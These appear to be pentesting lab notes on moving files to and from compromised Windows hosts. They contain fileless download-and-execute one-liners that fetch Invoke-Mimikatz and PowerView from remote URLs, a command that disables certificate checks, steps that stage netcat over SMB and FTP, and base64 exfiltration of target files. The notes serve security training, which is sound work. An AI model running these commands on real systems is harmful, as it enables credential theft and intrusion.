---
id: Transferring Files
aliases: []
tags:
  - Pentest/File-Transfer/Transferring-Files
---

# Windows

___

<!-- Download Operations {{{-->
## Download Operations

Download files to the target machine

<!-- PowerShell {{{-->
### PowerShell

<!-- PowerShell Web Downloads {{{-->
#### PowerShell Web Downloads

The [System.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0)
class can be used to download files over `HTTP`, `HTTPS` or `FTP`.

[DownloadFile](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)
— Download a file with the specified URI to a local file

```powershell
(New-Object Net.WebClient).DownloadFile('<target_file_url>','<out_file>')
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
> ```
<!-- }}} -->

[DownloadFileAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)
— Download a file with the specified URI to a local file
without blocking the thread

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<target_file_url>','<out_file>')
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
> ```
<!-- }}} -->

<!-- }}} -->

<!-- PowerShell Fileless Download {{{-->
#### PowerShell Fileless Download

Fileless attacks work by using some operating system functions
to download the payload and execute it directly

[Invoke-Expression](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5&viewFallbackFrom=powershell-7.2)
(*`IEX`*) — Run commands or expressions on the local computer

```powershell
IEX (New-Object Net.WebClient).DownloadString('<url>')
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
> ```
<!-- }}} -->

```powershell
(New-Object Net.WebClient).DownloadString('<url>') | IEX
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
> ```
<!-- }}} -->

PowerShell 3.0+

```powershell
IEX (iwr '<url>')
```

<!-- }}} -->

<!-- PowerShell Invoke-WebRequest {{{-->
#### PowerShell Invoke-WebRequest

From PowerShell 3.0 onwards, the `Invoke-WebRequest` cmdlet is also available

> [!tip]
>
> Use the aliases `iwr`, `curl`, and `wget` instead
> of the `Invoke-WebRequest` full name

[Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5&viewFallbackFrom=powershell-7.2)
— Get content from a web page on the Internet

```powershell
Invoke-WebRequest <url> -OutFile <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
> ```
<!-- }}} -->

<!-- }}} -->

<!-- PowerShell Errors {{{-->
#### PowerShell Errors

<!-- Internet Explorer First Launch {{{-->
##### Internet Explorer First Launch

There may be cases when the [Internet Explorer](https://en.wikipedia.org/wiki/Internet_Explorer)
first-launch configuration has not been completed,
which prevents the download

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
> ```
> ```powershell
> Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
> At line:1 char:1
> + Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
> + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
> + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
> + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
> ```
<!-- }}} -->

Bypass the error with the parameter `-UseBasicParsing`

```powershell
Invoke-WebRequest <url> -UseBasicParsing | IEX
```

<!-- }}} -->

<!-- SSL/TLS Certificate Not Trusted {{{-->
##### SSL/TLS Certificate Not Trusted

Could not establish trust relationship for the SSL/TLS secure channel

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
> ```
> ```powershell
> Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
> relationship for the SSL/TLS secure channel."
> At line:1 char:1
> + IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
> + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
>     + FullyQualifiedErrorId : WebException
> ```
<!-- }}} -->

Bypass the error with the following command

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- SMB {{{-->
### SMB

[[SMB/General|SMB]] enables applications and users
to transfer files to and from remote servers

<!-- Create Server {{{-->
#### Create Server

<!-- Unauthenticated {{{-->
##### Unauthenticated

[smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)
— Create an SMB server (*unauthenticated*)


```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo impacket-smbserver share -smb2support /tmp/smbshare
> ```
> ```sh
> Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
>
> [*] Config file parsed
> [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
> [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
> [*] Config file parsed
> [*] Config file parsed
> [*] Config file parsed
> ```
<!-- }}} -->

> [!warning]
>
> New versions of Windows block unauthenticated guest access
>
> ```cmd
> You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
> ```

<!-- }}} -->

<!-- Authenticated {{{-->
##### Authenticated

[smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)
— Create an SMB server (*authenticated*)

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
> ```
> ```sh
> Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
>
> [*] Config file parsed
> [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
> [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
> [*] Config file parsed
> [*] Config file parsed
> [*] Config file parsed
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

<!-- Copy Files {{{-->
#### Copy Files

Copy a file without credentials (*UNC path*)

```cmd
copy \\<ip>\<share>\<file>
```

<!-- Example {{{-->
> [!example]-
>
> ```cmd
> C:\htb> copy \\192.168.220.133\smbshare\nc.exe
> ```
> ```cmd
> 1 file(s) copied.
> ```
<!-- }}} -->

Mount SMB server with credentials & copy file

```cmd
net use n: \\<ip>\<share> /user:<user> <password>
```

```sh
copy n:\<file>
```

<!-- Example {{{-->
> [!example]-
>
> Mount SMB server with credentials (*`test:test`*)
>
> ```cmd
> C:\htb> net use n: \\192.168.220.133\share /user:test test
> ```
> ```cmd
> The command completed successfully.
> ```
> ```sh
> C:\htb> copy n:\nc.exe
> ```
> ```sh
> 1 file(s) copied.
> ```
<!-- }}} -->


<!-- }}} -->

___
<!-- }}} -->

<!-- FTP {{{-->
### FTP

[[FTP/General|FTP]] — Transfer files

<!-- Install {{{-->
#### Install

[pyftp](https://pypi.org/project/pyftpdlib/) —
Install asynchronous FTP server library

```sh
sudo pip3 install pyftpdlib
```

<!-- }}} -->

<!-- Create Server {{{-->
#### Create Server

Create FTP server

> [!tip]
>
> Specify port `21`, as `pyftpdlib` uses port `2121` by default

```sh
sudo python3 -m pyftpdlib --port 21
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo python3 -m pyftpdlib --port 21
> ```
> ```sh
> [I 2022-05-17 10:09:19] concurrency model: async
> [I 2022-05-17 10:09:19] masquerade (NAT) address: None
> [I 2022-05-17 10:09:19] passive ports: None
> [I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Transfer Files {{{-->
#### Transfer Files

<!-- Interactive Shell {{{-->
##### Interactive Shell

[Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-9.0)
— Transfer files

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ip>/<file>', 'C:\Users\Public\<out_file>')
```
<!-- }}} -->

<!-- Simple Shell {{{-->
##### Simple Shell

1. Create an FTP command file

<!-- Example {{{-->
> [!example]-
>
> ```sh
> echo open <ip> > ftpcommand.txt
> echo USER anonymous >> ftpcommand.txt
> echo binary >> ftpcommand.txt
> echo GET <file> >> ftpcommand.txt
> echo bye >> ftpcommand.txt
<!-- }}} -->

2. Connect & Execute the command file

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ftp -v -n -s:ftpcommand.txt
> ftp> open 192.168.49.128
> Log in with USER and PASS first.
> ftp> USER anonymous
>
> ftp> GET file.txt
> ftp> bye
>
> more file.txt
> This is a test file
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Upload Operations {{{-->
## Upload Operations

There are situations (*e.g., password cracking, analysis, exfiltration, etc.*)
where files must be uploaded from the target host to the attack host

<!-- PowerShell {{{-->
### PowerShell

<!-- Base64 {{{-->
#### Base64

1. **TARGET**: Encode a file to Base64

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
> ```
> ```powershell
> IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
> ```
<!-- }}} -->

2. **TARGET**: Run [md5sum](https://en.wikipedia.org/wiki/Md5sum)
   on the file for reference

```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
> ```
> ```powershell
> Hash
> ----
> 3688374325B992DEF12793500307566D
> ```
<!-- }}} -->

3. **ATTACKER**: Decode Base64 string

```sh
echo <base64_hash> | base64 -d > <file>
```

4. **ATTACKER**: Validate [md5sum](https://en.wikipedia.org/wiki/Md5sum)

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> md5sum hosts
> ```
> ```
> 3688374325b992def12793500307566d  hosts
> ```
<!-- }}} -->

<!-- }}} -->

#### Web Uploads

PowerShell doesn't have a built-in function for upload operations

[uploadserver](https://github.com/Densaugeo/uploadserver)
— Python's http.server extended to include a file upload page

```sh
pip3 install uploadserver
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> pip3 install uploadserver
> ```
> ```sh
> Collecting upload server
>   Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
> Installing collected packages: uploadserver
> Successfully installed uploadserver-2.0.1
> ```
<!-- }}} -->

```sh
python3 -m uploadserver
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python3 -m uploadserver
> ```
> ```sh
> File upload available at /upload
> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
> ```
<!-- }}} -->

<!-- }}} -->

### SMB

### FTP

___
<!-- }}} -->
